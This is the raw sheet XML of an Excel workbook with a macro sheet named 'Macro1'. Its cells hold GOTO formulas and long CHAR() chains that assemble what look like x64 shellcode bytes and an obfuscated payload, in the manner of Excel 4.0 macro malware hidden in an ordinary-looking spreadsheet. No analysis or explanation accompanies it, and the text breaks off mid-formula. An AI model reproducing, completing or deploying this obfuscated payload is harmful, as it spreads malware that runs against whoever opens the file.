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fhtw-my.sharepoint.com/personal/cs19m018_technikum-wien_at/Documents/"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="8_{7AB2D3B0-C891-49ED-87FE-A78959214731}" xr6:coauthVersionLast="46" xr6:coauthVersionMax="46" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-120" windowWidth="29040" windowHeight="15840" xr2:uid="{05834C75-E3AF-4709-BE37-3F45D20B1721}"/>
  </bookViews>
  <sheets>
    <sheet name="Macro1" sheetId="3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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="1">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</sst>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E73520A-0DFC-4744-9911-F6E25E5EA7C3}">
  <dimension ref="A1:C1024"/>
  <sheetViews>
    <sheetView showFormulas="1" tabSelected="1" workbookViewId="0">
      <selection sqref="A1:XFD1"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A1" t="b">
        <f>GOTO(A1)</f>
        <v>0</v>
      </c>
      <c r="B1" t="str">
        <f>CHAR(235)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(137)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(157)&amp;CHAR(252)&amp;CHAR(174)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(63)&amp;CHAR(153)&amp;CHAR(5)&amp;CHAR(116)&amp;CHAR(8)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(62)&amp;CHAR(157)&amp;CHAR(117)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(234)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(157)&amp;CHAR(235)&amp;CHAR(139)&amp;CHAR(92)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(82)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(176)&amp;CHAR(128)&amp;CHAR(123)&amp;CHAR(130)&amp;CHAR(161)&amp;CHAR(220)&amp;CHAR(192)&amp;CHAR(45)&amp;CHAR(223)&amp;CHAR(130)&amp;CHAR(214)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(42)&amp;CHAR(83)&amp;CHAR(171)&amp;CHAR(186)&amp;CHAR(135)&amp;CHAR(84)&amp;CHAR(72)&amp;CHAR(135)&amp;CHAR(37)&amp;CHAR(96)&amp;CHAR(238)&amp;CHAR(236)&amp;CHAR(192)&amp;CHAR(155)&amp;CHAR(209)&amp;CHAR(176)&amp;CHAR(20)&amp;CHAR(95)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(233)&amp;CHAR(105)&amp;CHAR(112)&amp;CHAR(16)&amp;CHAR(34)&amp;CHAR(167)&amp;CHAR(103)&amp;CHAR(163)&amp;CHAR(117)&amp;CHAR(242)&amp;CHAR(172)&amp;CHAR(42)&amp;CHAR(226)&amp;CHAR(195)&amp;CHAR(209)&amp;CHAR(162)&amp;CHAR(113)&amp;CHAR(189)&amp;CHAR(112)&amp;CHAR(52)&amp;CHAR(35)&amp;CHAR(144)&amp;CHAR(139)&amp;CHAR(12)&amp;CHAR(150)&amp;CHAR(225)&amp;CHAR(108)&amp;CHAR(61)&amp;CHAR(73)&amp;CHAR(191)&amp;CHAR(156)&amp;CHAR(149)&amp;CHAR(31)&amp;CHAR(31)&amp;CHAR(191)&amp;CHAR(223)&amp;CHAR(224)&amp;CHAR(170)&amp;CHAR(126)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(69)&amp;CHAR(68)&amp;CHAR(161)&amp;CHAR(38)&amp;CHAR(13)&amp;CHAR(93)&amp;CHAR(150)&amp;CHAR(99)&amp;CHAR(92)&amp;CHAR(118)&amp;CHAR(194)&amp;CHAR(158)&amp;CHAR(158)&amp;CHAR(28)&amp;CHAR(109)&amp;CHAR(181)&amp;CHAR(180)&amp;CHAR(102)&amp;CHAR(24)&amp;CHAR(39)&amp;CHAR(58)&amp;CHAR(40)&amp;CHAR(40)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(198)&amp;CHAR(25)&amp;CHAR(185)&amp;CHAR(52)&amp;CHAR(231)&amp;CHAR(131)&amp;CHAR(177)&amp;CHAR(239)&amp;CHAR(189)&amp;CHAR(152)&amp;CHAR(64)&amp;CHAR(139)&amp;CHAR(39)&amp;CHAR(250)&amp;CHAR(36)&amp;CHAR(60)&amp;CHAR(208)&amp;CHAR(198)&amp;CHAR(210)&amp;CHAR(3)&amp;CHAR(99)&amp;CHAR(116)&amp;CHAR(20)&amp;CHAR(10)&amp;CHAR(131)</f>
        <v>ë#[‰ß°ü®uý‰ù‰ÞŠ_x0006_0_x0007_Gf?™_x0005_t_x0008_F€&gt;uîëêÿáèØÿÿÿ_x0003__x0003__x0005__x000D__x0005__x000B__x000B__x0001__x000D__x0005__x0005__x0003__x0006__x000C__x0005__x0006__x0002__x0005__x0005__x0005_	
_x0002__x0004__x0002__x0012__x0011__x0006__x0002__x0007_
_x0007__x0005__x0003__x0004__x0005__x0006_
_x0003__x000B_
_x0006__x0002__x000D__x0001__x0004_	
_x0005__x0014__x0004__x0005__x000B__x0006_
_x000B__x0015__x0001__x0002_	_x0007__x0006__x000D__x0013__x0001__x0005__x0002_
_x0002__x0002__x0005__x0003__x0005__x0001__x0001__x0002_ë‹\_x000D__x0005_ƒR_x0001__x000D_ú°€{‚¡ÜÀ-ß‚Ö_x0007__x0002_*S«º‡TH‡%`îìÀ›Ñ°_x0014___x0006__x0002__x000D__x0001_éip_x0010_"§g£uò¬*âÃÑ¢q½p4#‹_x000C_–ál=I¿œ•_x001F__x001F_¿ßàª~††ED¡&amp;_x000D_]–c\vÂžž_x001C_mµ´f_x0018_':((
Æ_x0019_¹4çƒ±ï½˜@‹'ú$&lt;ÐÆÒ_x0003_ct_x0014_
ƒ</v>
      </c>
      <c r="C1" t="str">
        <f>CHAR(72)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(129)&amp;CHAR(233)&amp;CHAR(7)&amp;CHAR(251)&amp;CHAR(255)&amp;CHAR(255)</f>
        <v>H1ÉHé_x0007_ûÿÿ</v>
      </c>
    </row>
    <row r="2" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A2" t="b">
        <f>GOTO(A2)</f>
        <v>0</v>
      </c>
      <c r="B2" t="str">
        <f>CHAR(26)&amp;CHAR(84)&amp;CHAR(70)&amp;CHAR(242)&amp;CHAR(111)&amp;CHAR(68)&amp;CHAR(118)&amp;CHAR(224)&amp;CHAR(205)&amp;CHAR(213)&amp;CHAR(239)&amp;CHAR(13)&amp;CHAR(181)&amp;CHAR(17)&amp;CHAR(115)&amp;CHAR(16)&amp;CHAR(94)&amp;CHAR(167)&amp;CHAR(92)&amp;CHAR(54)&amp;CHAR(128)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(234)&amp;CHAR(169)&amp;CHAR(105)&amp;CHAR(135)&amp;CHAR(231)&amp;CHAR(144)&amp;CHAR(207)&amp;CHAR(157)&amp;CHAR(6)&amp;CHAR(200)&amp;CHAR(168)&amp;CHAR(89)&amp;CHAR(68)&amp;CHAR(76)&amp;CHAR(78)&amp;CHAR(248)&amp;CHAR(214)&amp;CHAR(237)&amp;CHAR(167)&amp;CHAR(244)&amp;CHAR(172)&amp;CHAR(98)&amp;CHAR(189)&amp;CHAR(3)&amp;CHAR(202)&amp;CHAR(223)&amp;CHAR(42)&amp;CHAR(184)&amp;CHAR(36)&amp;CHAR(240)&amp;CHAR(112)&amp;CHAR(64)&amp;CHAR(10)&amp;CHAR(152)&amp;CHAR(97)&amp;CHAR(41)&amp;CHAR(131)&amp;CHAR(161)&amp;CHAR(2)&amp;CHAR(166)&amp;CHAR(103)&amp;CHAR(36)&amp;CHAR(244)&amp;CHAR(12)&amp;CHAR(113)&amp;CHAR(77)&amp;CHAR(66)&amp;CHAR(19)&amp;CHAR(106)&amp;CHAR(146)&amp;CHAR(134)&amp;CHAR(150)&amp;CHAR(16)&amp;CHAR(90)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(96)&amp;CHAR(113)&amp;CHAR(232)&amp;CHAR(160)&amp;CHAR(112)&amp;CHAR(50)&amp;CHAR(89)&amp;CHAR(201)&amp;CHAR(182)&amp;CHAR(166)&amp;CHAR(2)&amp;CHAR(197)&amp;CHAR(252)&amp;CHAR(191)&amp;CHAR(204)&amp;CHAR(236)&amp;CHAR(250)&amp;CHAR(221)&amp;CHAR(44)&amp;CHAR(233)&amp;CHAR(156)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(212)&amp;CHAR(56)&amp;CHAR(142)&amp;CHAR(151)&amp;CHAR(137)&amp;CHAR(40)&amp;CHAR(192)&amp;CHAR(158)&amp;CHAR(75)&amp;CHAR(57)&amp;CHAR(132)&amp;CHAR(163)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(65)&amp;CHAR(177)&amp;CHAR(5)&amp;CHAR(247)&amp;CHAR(29)&amp;CHAR(192)&amp;CHAR(168)&amp;CHAR(58)&amp;CHAR(73)&amp;CHAR(3)&amp;CHAR(171)&amp;CHAR(54)&amp;CHAR(81)&amp;CHAR(35)&amp;CHAR(209)&amp;CHAR(19)&amp;CHAR(100)&amp;CHAR(130)&amp;CHAR(178)&amp;CHAR(6)&amp;CHAR(250)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(202)&amp;CHAR(224)&amp;CHAR(56)&amp;CHAR(209)&amp;CHAR(138)&amp;CHAR(139)&amp;CHAR(103)&amp;CHAR(203)&amp;CHAR(46)&amp;CHAR(255)&amp;CHAR(79)&amp;CHAR(204)&amp;CHAR(93)&amp;CHAR(21)&amp;CHAR(210)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(90)&amp;CHAR(118)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(102)&amp;CHAR(21)&amp;CHAR(79)&amp;CHAR(158)&amp;CHAR(11)&amp;CHAR(175)&amp;CHAR(241)&amp;CHAR(246)&amp;CHAR(14)&amp;CHAR(159)&amp;CHAR(68)&amp;CHAR(146)&amp;CHAR(60)&amp;CHAR(100)&amp;CHAR(226)&amp;CHAR(169)&amp;CHAR(128)&amp;CHAR(227)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)</f>
        <v>_x001A_TFòoDvàÍÕï_x000D_µ_x0011_s_x0010_^§\6€‰_x0001_ê©i‡çÏ_x0006_È¨YDLNøÖí§ô¬b½_x0003_Êß*¸$ðp@
˜a)ƒ¡_x0002_¦g$ô_x000C_qMB_x0013_j’†–_x0010_ZA_x0008_`qè p2YÉ¶¦_x0002_Åü¿ÌìúÝ,éœ_x0018_†Ô8Ž—‰(ÀžK9„£v:A±_x0005_÷_x001D_À¨:I_x0003_«6Q#Ñ_x0013_d‚²_x0006_ú9_x000E_Þ#Êà8ÑŠ‹gË.ÿOÌ]_x0015_Òß	Zvþuf_x0015_Ož_x000B_¯ñö_x000E_ŸD’&lt;dâ©€ã_x000C__x0005__x0006__x0002__x0005__x0005__x0005_	
_x0002__x0004__x0002__x0012__x0011__x0006__x0002__x0007_
_x0007__x0005__x0003__x0004__x0005__x0006_
_x0003__x000B_
_x0006__x0002__x000D__x0001__x0004_	
_x0005__x0014__x0004__x0005__x000B__x0006_
_x000B__x0015__x0001__x0002_	_x0007__x0006__x000D__x0013__x0001__x0005__x0002_
_x0002__x0002__x0005__x0003__x0005__x0001__x0001__x0002__x0003__x0003__x0005__x000D__x0005__x000B__x000B__x0001__x000D__x0005__x0005_</v>
      </c>
      <c r="C2" t="str">
        <f>CHAR(72)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>H_x0005_ïÿÿÿH»ë</v>
      </c>
    </row>
    <row r="3" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A3" t="b">
        <f>GOTO(A3)</f>
        <v>0</v>
      </c>
      <c r="B3" t="str">
        <f>CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(117)&amp;CHAR(12)&amp;CHAR(33)&amp;CHAR(102)&amp;CHAR(46)&amp;CHAR(12)&amp;CHAR(109)&amp;CHAR(204)&amp;CHAR(230)&amp;CHAR(128)&amp;CHAR(31)&amp;CHAR(201)&amp;CHAR(200)&amp;CHAR(70)&amp;CHAR(148)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(54)&amp;CHAR(149)&amp;CHAR(72)&amp;CHAR(145)&amp;CHAR(168)&amp;CHAR(119)&amp;CHAR(37)&amp;CHAR(173)&amp;CHAR(13)&amp;CHAR(196)&amp;CHAR(209)&amp;CHAR(173)&amp;CHAR(33)&amp;CHAR(57)&amp;CHAR(232)&amp;CHAR(193)&amp;CHAR(45)&amp;CHAR(128)&amp;CHAR(208)&amp;CHAR(20)&amp;CHAR(54)&amp;CHAR(32)&amp;CHAR(179)&amp;CHAR(27)&amp;CHAR(17)&amp;CHAR(28)&amp;CHAR(191)&amp;CHAR(55)&amp;CHAR(191)&amp;CHAR(173)&amp;CHAR(241)&amp;CHAR(173)&amp;CHAR(42)&amp;CHAR(204)&amp;CHAR(163)&amp;CHAR(61)&amp;CHAR(212)&amp;CHAR(91)&amp;CHAR(201)&amp;CHAR(228)&amp;CHAR(236)&amp;CHAR(78)&amp;CHAR(154)&amp;CHAR(172)&amp;CHAR(10)&amp;CHAR(162)&amp;CHAR(145)&amp;CHAR(197)&amp;CHAR(174)&amp;CHAR(149)&amp;CHAR(228)&amp;CHAR(58)&amp;CHAR(243)&amp;CHAR(97)&amp;CHAR(87)&amp;CHAR(180)&amp;CHAR(85)&amp;CHAR(125)&amp;CHAR(32)&amp;CHAR(249)&amp;CHAR(109)&amp;CHAR(35)&amp;CHAR(160)&amp;CHAR(59)</f>
        <v>_x0003__x0006__x000C__x0005__x0006__x0002__x0005__x0005__x0005_	
_x0002__x0004__x0002__x0012__x0011__x0006__x0002__x0007_
_x0007__x0005__x0003__x0004__x0005__x0006_
_x0003__x000B_
_x0006__x0002__x000D__x0001__x0004_	
_x0005__x0014__x0004__x0005__x000B__x0006_
_x000B__x0015__x0001__x0002_	_x0007__x0006__x000D__x0013__x0001__x0005__x0002_
_x0002__x0002__x0005__x0003__x0005__x0001__x0001__x0002__x0003__x0003__x0005__x000D__x0005__x000B__x000B__x0001__x000D__x0005__x0005__x0003__x0006__x000C__x0005__x0006__x0002__x0005__x0005__x0005_	
_x0002__x0004__x0002__x0012__x0011__x0006__x0002__x0007_
_x0007__x0005__x0003__x0004__x0005__x0006_
_x0003__x000B_
_x0006__x0002__x000D__x0001__x0004_	
_x0005__x0014__x0004__x0005__x000B__x0006_
_x000B__x0015__x0001__x0002_	_x0007__x0006__x000D__x0013__x0001__x0005__x0002_
_x0002__x0002__x0005__x0003__x0005__x0001__x0001__x0002__x0003__x0003__x0005__x000D__x0005__x000B__x000B__x0001__x000D__x0005__x0005__x0003__x0006__x000C__x0005__x0006__x0002__x0005__x0005__x0005_	
_x0002__x0004__x0002__x0012__x0011__x0006__x0002__x0007_
_x0007__x0005_u_x000C_!f._x000C_mÌæ€_x001F_ÉÈF”=66•H‘¨w%­_x000D_ÄÑ­!9èÁ-€Ð_x0014_6 ³_x001B__x0011__x001C_¿7¿­ñ­*Ì£=Ô[ÉäìNš¬
¢‘Å®•ä:óaW´U} ùm# ;</v>
      </c>
      <c r="C3" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(72)&amp;CHAR(49)&amp;CHAR(88)</f>
        <v>»ë÷ýô6ÍH1X</v>
      </c>
    </row>
    <row r="4" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A4" t="b">
        <f>GOTO(A4)</f>
        <v>0</v>
      </c>
      <c r="B4" t="str">
        <f>CHAR(143)&amp;CHAR(113)&amp;CHAR(57)&amp;CHAR(75)&amp;CHAR(12)&amp;CHAR(54)&amp;CHAR(204)&amp;CHAR(3)&amp;CHAR(51)&amp;CHAR(181)&amp;CHAR(188)&amp;CHAR(17)&amp;CHAR(120)&amp;CHAR(163)&amp;CHAR(198)&amp;CHAR(223)&amp;CHAR(183)&amp;CHAR(117)&amp;CHAR(76)&amp;CHAR(154)&amp;CHAR(188)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(46)&amp;CHAR(65)&amp;CHAR(226)&amp;CHAR(108)&amp;CHAR(205)&amp;CHAR(243)&amp;CHAR(157)&amp;CHAR(154)&amp;CHAR(248)&amp;CHAR(106)&amp;CHAR(212)&amp;CHAR(236)&amp;CHAR(216)&amp;CHAR(214)&amp;CHAR(79)&amp;CHAR(255)&amp;CHAR(252)&amp;CHAR(69)&amp;CHAR(148)&amp;CHAR(80)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(118)&amp;CHAR(71)&amp;CHAR(191)&amp;CHAR(41)&amp;CHAR(113)&amp;CHAR(82)&amp;CHAR(65)&amp;CHAR(235)&amp;CHAR(246)&amp;CHAR(97)&amp;CHAR(233)&amp;CHAR(63)&amp;CHAR(183)&amp;CHAR(251)&amp;CHAR(222)&amp;CHAR(254)&amp;CHAR(109)&amp;CHAR(178)&amp;CHAR(108)&amp;CHAR(27)&amp;CHAR(1)&amp;CHAR(45)&amp;CHAR(221)&amp;CHAR(140)&amp;CHAR(205)&amp;CHAR(214)&amp;CHAR(72)&amp;CHAR(56)&amp;CHAR(218)&amp;CHAR(69)&amp;CHAR(15)&amp;CHAR(58)&amp;CHAR(13)&amp;CHAR(208)&amp;CHAR(71)&amp;CHAR(237)&amp;CHAR(1)&amp;CHAR(255)&amp;CHAR(64)&amp;CHAR(175)&amp;CHAR(246)&amp;CHAR(167)&amp;CHAR(149)&amp;CHAR(42)&amp;CHAR(78)&amp;CHAR(228)&amp;CHAR(78)&amp;CHAR(200)&amp;CHAR(21)&amp;CHAR(93)&amp;CHAR(83)&amp;CHAR(8)&amp;CHAR(4)&amp;CHAR(165)&amp;CHAR(44)&amp;CHAR(34)&amp;CHAR(225)&amp;CHAR(102)&amp;CHAR(150)&amp;CHAR(214)&amp;CHAR(252)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(101)&amp;CHAR(190)&amp;CHAR(150)&amp;CHAR(89)&amp;CHAR(239)&amp;CHAR(5)&amp;CHAR(207)&amp;CHAR(39)&amp;CHAR(64)&amp;CHAR(240)&amp;CHAR(178)&amp;CHAR(154)&amp;CHAR(186)&amp;CHAR(61)&amp;CHAR(25)&amp;CHAR(18)&amp;CHAR(76)&amp;CHAR(186)&amp;CHAR(208)&amp;CHAR(162)&amp;CHAR(44)&amp;CHAR(53)&amp;CHAR(242)&amp;CHAR(201)&amp;CHAR(215)&amp;CHAR(11)&amp;CHAR(226)&amp;CHAR(215)&amp;CHAR(243)&amp;CHAR(70)&amp;CHAR(90)&amp;CHAR(211)&amp;CHAR(53)&amp;CHAR(71)&amp;CHAR(178)&amp;CHAR(189)&amp;CHAR(250)&amp;CHAR(188)&amp;CHAR(27)&amp;CHAR(84)&amp;CHAR(119)&amp;CHAR(227)&amp;CHAR(19)&amp;CHAR(134)&amp;CHAR(122)&amp;CHAR(113)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(90)&amp;CHAR(70)&amp;CHAR(202)&amp;CHAR(225)&amp;CHAR(219)&amp;CHAR(243)&amp;CHAR(117)&amp;CHAR(247)&amp;CHAR(50)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(161)&amp;CHAR(94)&amp;CHAR(110)&amp;CHAR(125)&amp;CHAR(188)&amp;CHAR(240)&amp;CHAR(172)&amp;CHAR(52)&amp;CHAR(242)&amp;CHAR(210)&amp;CHAR(138)&amp;CHAR(173)&amp;CHAR(94)&amp;CHAR(52)&amp;CHAR(69)&amp;CHAR(20)&amp;CHAR(151)&amp;CHAR(127)&amp;CHAR(64)&amp;CHAR(54)&amp;CHAR(255)&amp;CHAR(31)&amp;CHAR(238)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(45)&amp;CHAR(222)&amp;CHAR(143)&amp;CHAR(100)&amp;CHAR(15)&amp;CHAR(186)&amp;CHAR(198)&amp;CHAR(219)&amp;CHAR(176)&amp;CHAR(167)&amp;CHAR(102)&amp;CHAR(173)&amp;CHAR(169)&amp;CHAR(214)&amp;CHAR(202)&amp;CHAR(215)&amp;CHAR(36)&amp;CHAR(28)&amp;CHAR(193)&amp;CHAR(23)&amp;CHAR(157)&amp;CHAR(191)&amp;CHAR(93)&amp;CHAR(16)&amp;CHAR(118)&amp;CHAR(29)&amp;CHAR(203)&amp;CHAR(59)&amp;CHAR(227)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(84)&amp;CHAR(27)&amp;CHAR(57)&amp;CHAR(80)&amp;CHAR(127)&amp;CHAR(112)&amp;CHAR(150)&amp;CHAR(236)&amp;CHAR(101)&amp;CHAR(157)&amp;CHAR(33)&amp;CHAR(123)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(62)&amp;CHAR(217)&amp;CHAR(58)&amp;CHAR(133)&amp;CHAR(125)&amp;CHAR(145)&amp;CHAR(48)&amp;CHAR(191)&amp;CHAR(81)&amp;CHAR(189)&amp;CHAR(182)&amp;CHAR(33)&amp;CHAR(37)&amp;CHAR(136)&amp;CHAR(134)&amp;CHAR(253)&amp;CHAR(122)&amp;CHAR(100)</f>
